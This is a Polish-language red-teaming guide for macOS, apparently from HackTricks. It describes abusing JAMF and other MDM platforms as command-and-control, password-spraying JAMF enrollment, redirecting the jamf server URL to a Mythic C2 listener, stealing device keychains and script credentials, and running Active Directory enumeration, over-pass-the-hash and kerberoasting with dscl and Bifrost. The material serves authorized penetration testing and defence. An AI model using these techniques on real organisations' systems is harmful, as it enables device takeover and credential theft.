# Red Teaming w macOS

{{#include ../../banners/hacktricks-training.md}}


## Nadużywanie MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Jeśli uda Ci się **przejąć dane uwierzytelniające administratora** umożliwiające dostęp do platformy zarządzającej, możesz **potencjalnie przejąć wszystkie komputery**, dystrybuując malware na tych maszynach.

W ramach red teamingu w środowiskach MacOS zdecydowanie zaleca się posiadanie pewnej wiedzy na temat działania MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Używanie MDM jako C2

MDM będzie mieć uprawnienia do instalowania, odpytywania lub usuwania profili, instalowania aplikacji, tworzenia lokalnych kont administratora, ustawiania hasła firmware, zmiany klucza FileVault...

Aby uruchomić własny MDM, potrzebujesz **CSR podpisanego przez vendora**, który możesz spróbować uzyskać za pomocą [**https://mdmcert.download/**](https://mdmcert.download/). Aby uruchomić własny MDM dla urządzeń Apple, możesz użyć [**MicroMDM**](https://github.com/micromdm/micromdm).

Aby jednak zainstalować aplikację na zarejestrowanym urządzeniu, nadal musisz podpisać ją za pomocą konta deweloperskiego... jednak podczas rejestracji w MDM **urządzenie dodaje certyfikat SSL MDM jako zaufany CA**, więc możesz teraz podpisywać dowolne elementy.<sup>[[4]](#references)</sup>

Aby zarejestrować urządzenie w MDM, należy zainstalować plik **`mobileconfig`** jako root; można go dostarczyć za pomocą pliku **pkg** (możesz skompresować go w zip, a po pobraniu z Safari zostanie zdekompresowany).

**Agent Mythic Orthrus** używa tej techniki.

### Nadużywanie JAMF PRO

JAMF może uruchamiać **custom scripts** (skrypty opracowane przez sysadmina), **native payloads** (tworzenie kont lokalnych, ustawianie hasła EFI, monitorowanie plików/procesów...) oraz **MDM** (konfiguracje urządzeń, certyfikaty urządzeń...).<sup>[[5]](#references)</sup>

#### Samodzielna rejestracja JAMF

Przejdź na stronę taką jak `https://<company-name>.jamfcloud.com/enroll/`, aby sprawdzić, czy mają włączoną **samodzielną rejestrację**. Jeśli tak, strona może **poprosić o dane uwierzytelniające**.

Możesz użyć skryptu [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) do przeprowadzenia ataku password spraying.

Ponadto po znalezieniu prawidłowych danych uwierzytelniających możesz być w stanie przeprowadzić brute-force innych nazw użytkowników za pomocą poniższego formularza:

![Nadużywanie JAMF PRO - samodzielna rejestracja JAMF: Ponadto po znalezieniu prawidłowych danych uwierzytelniających możesz być w stanie przeprowadzić brute-force innych nazw użytkowników za pomocą poniższego formularza](<../../images/image (107).png>)

#### Uwierzytelnianie urządzenia JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Plik binarny **`jamf`** zawierał sekret służący do otwierania keychaina, który w momencie odkrycia był **współdzielony** przez wszystkich i miał wartość: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Ponadto jamf **utrzymuje trwałość** jako **LaunchDaemon** w **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Przejęcie urządzenia JAMF

Adres **URL** **JSS** (Jamf Software Server), którego używa **`jamf`**, znajduje się w **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Plik ten zasadniczo zawiera adres URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Zatem atakujący mógłby umieścić złośliwy pakiet (`pkg`), który podczas instalacji **nadpisuje ten plik**, ustawiając **URL na listener Mythic C2 z agenta Typhon**, aby móc teraz nadużywać JAMF jako C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Aby **podszyć się pod komunikację** między urządzeniem a JMF, potrzebujesz:

- **UUID** urządzenia: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** z: `/Library/Application\ Support/Jamf/JAMF.keychain`, który zawiera certyfikat urządzenia

Korzystając z tych informacji, **utwórz VM** ze **skradzionym** Hardware **UUID** i z **wyłączonym SIP**, umieść w niej **JAMF keychain**, wykonaj **hook** na **agencie** Jamf i ukradnij jego informacje.

#### Kradzież sekretów

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Możesz również monitorować lokalizację `/Library/Application Support/Jamf/tmp/` pod kątem **custom scripts**, które administratorzy mogą chcieć wykonać za pośrednictwem Jamf, ponieważ są one **umieszczane tutaj, wykonywane i usuwane**. Te skrypty **mogą zawierać credentials**.

Jednak **credentials** mogą być przekazywane do tych skryptów jako **parameters**, dlatego konieczne byłoby monitorowanie `ps aux | grep -i jamf` (nawet bez uprawnień root).

Skrypt [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) może nasłuchiwać dodawania nowych plików oraz nowych argumentów procesów.

### Zdalny dostęp do macOS

A także informacje o "specjalnych" **network** **protocols** systemu **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

W niektórych przypadkach okaże się, że **komputer MacOS jest połączony z AD**. W takim scenariuszu spróbuj **enumerować** active directory, tak jak zwykle. Więcej **help** znajdziesz na następujących stronach:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Pomocnym **lokalnym narzędziem MacOS** może być również `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Istnieją również narzędzia przygotowane dla systemu MacOS, które automatycznie enumerują AD i umożliwiają pracę z kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound jest rozszerzeniem narzędzia audytującego Bloodhound, które umożliwia zbieranie i importowanie relacji Active Directory na hostach MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost to projekt Objective-C zaprojektowany do interakcji z API Heimdal krb5 w systemie macOS. Celem projektu jest umożliwienie lepszego security testing dotyczącego Kerberos na urządzeniach macOS z wykorzystaniem natywnych API, bez konieczności używania innych frameworków lub pakietów na celu.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Narzędzie JavaScript for Automation (JXA) do enumeracji Active Directory.

### Informacje o domenie
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Użytkownicy

Trzy typy użytkowników systemu macOS to:

- **Local Users** — Zarządzani przez lokalną usługę OpenDirectory, nie są w żaden sposób połączeni z Active Directory.
- **Network Users** — Ulokowani użytkownicy Active Directory, którzy wymagają połączenia z serwerem DC do uwierzytelnienia.
- **Mobile Users** — Użytkownicy Active Directory z lokalną kopią zapasową swoich poświadczeń i plików.

Lokalne informacje o użytkownikach i grupach są przechowywane w folderze _/var/db/dslocal/nodes/Default._\
Na przykład informacje o użytkowniku o nazwie _mark_ są przechowywane w _/var/db/dslocal/nodes/Default/users/mark.plist_, a informacje o grupie _admin_ znajdują się w _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Oprócz używania krawędzi HasSession i AdminTo, **MacHound dodaje trzy nowe krawędzie** do bazy danych Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** - podmiot uprawniony do używania SSH do hosta
- **CanVNC** - podmiot uprawniony do używania VNC do hosta
- **CanAE** - podmiot uprawniony do wykonywania skryptów AppleEvent na hoście
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Więcej informacji na stronie [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Hasło Computer$

Uzyskaj hasła za pomocą:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Możliwe jest uzyskanie dostępu do hasła **`Computer$`** w keychainie System.

### Over-Pass-The-Hash

Uzyskaj TGT dla określonego użytkownika i usługi:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Po zebraniu TGT można wstrzyknąć go do bieżącej sesji za pomocą:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Po uzyskaniu service tickets można spróbować uzyskać dostęp do udziałów na innych komputerach:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Uzyskiwanie dostępu do Keychain

Keychain z dużym prawdopodobieństwem zawiera poufne informacje, które po uzyskaniu do nich dostępu bez wyświetlania promptu mogłyby pomóc w dalszym prowadzeniu ćwiczenia red team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Usługi zewnętrzne

Red Teaming systemu macOS różni się od standardowego Red Teamingu systemu Windows, ponieważ **macOS jest zazwyczaj bezpośrednio zintegrowany z kilkoma zewnętrznymi platformami**. Typowa konfiguracja macOS umożliwia dostęp do komputera za pomocą **zsynchronizowanych poświadczeń OneLogin oraz dostęp do kilku usług zewnętrznych** (takich jak github, aws...) za pośrednictwem OneLogin.

## Różne techniki Red Team

### Safari

Gdy plik jest pobierany w Safari i jest „bezpiecznym” plikiem, zostanie **automatycznie otwarty**. Na przykład po **pobraniu archiwum zip** zostanie ono automatycznie rozpakowane:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Materiały referencyjne

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
